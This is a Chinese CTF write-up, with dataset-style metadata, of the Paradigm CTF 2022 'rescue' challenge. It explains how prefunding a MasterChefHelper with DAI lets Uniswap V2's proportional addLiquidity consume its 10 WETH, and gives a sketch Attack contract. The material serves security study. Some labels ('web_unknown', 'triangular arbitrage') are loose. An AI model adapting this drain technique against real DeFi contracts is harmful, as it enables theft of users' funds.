---
title: PARADIGM CTF 2022 题目分析 rescue (Uniswap V2 流动性)
contest: PARADIGM CTF
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [MasterChefHelper.sol, Uniswap V2, 流动性添加, DAI/WETH, DeFi 攻击]
attack_chain: |
  1. 题目背景: PARADIGM CTF 2022, 23 道题, 400+ 队伍
  2. MasterChefHelper.sol 合约:
     - swapTokenForPoolToken(poolId, tokenIn, amountIn, minAmountOut)
     - 流程: 转一半 tokenIn → 兑换成 pool 对应 pair 的 token0, 另一半换 token1
     - 两者按比例 addLiquidity → 拿 LP token
  3. Setup.sol 合约:
     - 创建时抵押 10 ETH → 拿 10 WETH
     - 把 10 WETH 转给 mcHelper 合约
     - 题目要求: 把 mcHelper 合约下的 10 WETH 转走
  4. 攻击:
     - 攻击合约: 转入部分 ETH
     - uniswap 兑换 poolId=2 (DAI/WETH pair) 不同的代币 (USDT)
     - 兑换 20 ETH 的 DAI 转入 mcHelper (与 10 WETH 等比例)
     - 调 swapTokenForPoolToken(2, USDT, X, 0): mcHelper 内部 addLiquidity 把所有 DAI+WETH 按比例添加 → 多余 DAI 留合约, WETH 全转走
  5. 关键: uniswap addLiquidity 按比例添加, 凑足 DAI 后 WETH 被全部用掉
key_payload: |
  # 攻击合约:
  contract Attack {
      function hack() external {
          // 1. uniswap swap 20 ETH → DAI
          uni.swapETHForExactTokens{value: 20 ether}(...);
          // 2. transfer DAI to mcHelper
          dai.transfer(mcHelper, dai.balanceOf(this));
          // 3. mcHelper.swapTokenForPoolToken(2, USDT, amount, 0)
          //    → 内部 swap 兑换 pair 中 token0 (WETH) + token1 (DAI)
          //    → addLiquidity 把所有 token0 + token1 按比例添加
          mcHelper.swapTokenForPoolToken(2, USDT, usdt.balanceOf(this), 0);
      }
  }
one_liner: PARADIGM CTF 2022 rescue: MasterChefHelper.sol + Uniswap V2 addLiquidity 按比例添加, 凑足 DAI 比例转走 10 WETH。
lesson: |
  - Uniswap V2 addLiquidity 按比例添加, 不是简单 add all
  - 攻击需要凑足 pair 两种代币的比例才能转走
  - 转 USDT (与 pair 不同币种) → mcHelper 内部 swap → 凑 DAI+WETH
  - 题目要求: mcHelper 合约下 10 WETH 转走
  - DAI/WETH pair + USDT 是常见三角套利模型
  - 关键 trick: 调 swapTokenForPoolToken(2, USDT, X, 0) 触发内部两次 swap + 一次 addLiquidity
quality: high
---

# PARADIGM CTF 2022 题目分析 (1) - rescue

> 来源: ctfiot.com 80208 - NUMEN Cyber Labs

## 比赛概况

- 2022-08-20 ~ 2022-08-22 (48 小时)
- 23 道题, 400+ 队伍
- 全球区块链安全 CTF 比赛

## MasterChefHelper.sol 合约

```solidity
function swapTokenForPoolToken(
    uint256 poolId,      // MasterChef 中 pool 对应 uniswap pair 地址
    address tokenIn,     // 转入代币
    uint256 amountIn,    // 兑换数量
    uint256 minAmountOut // 获得 LP 最小数量, 填 0
) external {
    // 1. 转一半 tokenIn 兑换成 pair 的 token0
    // 2. 转另一半 tokenIn 兑换成 token1
    // 3. 两者按比例 addLiquidity → 拿 LP token
}
```

## Setup.sol 合约

- 创建时抵押 10 ETH → 拿 10 WETH
- 把 10 WETH 转给 mcHelper 合约
- 题目要求：**把 mcHelper 合约下的 10 WETH 转走**

## 攻击

```solidity
contract Attack {
    MasterChefHelper mcHelper;
    Uniswap uni;
    IERC20 dai, usdt, weth;
    
    function hack() external {
        // 1. uniswap swap 20 ETH → DAI
        uni.swapETHForExactTokens{value: 20 ether}(...);
        
        // 2. transfer DAI to mcHelper
        dai.transfer(address(mcHelper), dai.balanceOf(address(this)));
        
        // 3. mcHelper.swapTokenForPoolToken(2, USDT, X, 0)
        //    poolId=2 对应 DAI/WETH pair
        //    tokenIn=USDT (与 pair 不同的币种)
        //    内部: USDT 一半换 DAI, 一半换 WETH
        //         然后 DAI + WETH 按比例 addLiquidity
        //         → WETH 全部用掉, 多余 DAI 留合约
        mcHelper.swapTokenForPoolToken(2, address(usdt), usdt.balanceOf(address(this)), 0);
    }
}
```

## 关键 trick

1. 调 `swapTokenForPoolToken(2, USDT, X, 0)` 触发内部两次 swap + 一次 addLiquidity
2. 凑足 DAI 比例，让 WETH 全部用掉
3. 兑换 20 ETH 的 DAI（防止不够）

## 评价

PARADIGM CTF 2022 rescue DeFi 题，亮点：
- **Uniswap V2 addLiquidity 按比例添加** 不是简单的 add all
- **三角套利** USDT → DAI + WETH → addLiquidity
- **MasterChefHelper** 中间层让 tokenIn 必须是 pair 之外的代币
- 凑足 DAI 比例后 WETH 自动全部用掉

适用读者：DeFi 安全研究员 / Solidity 合约 / Uniswap V2 专家
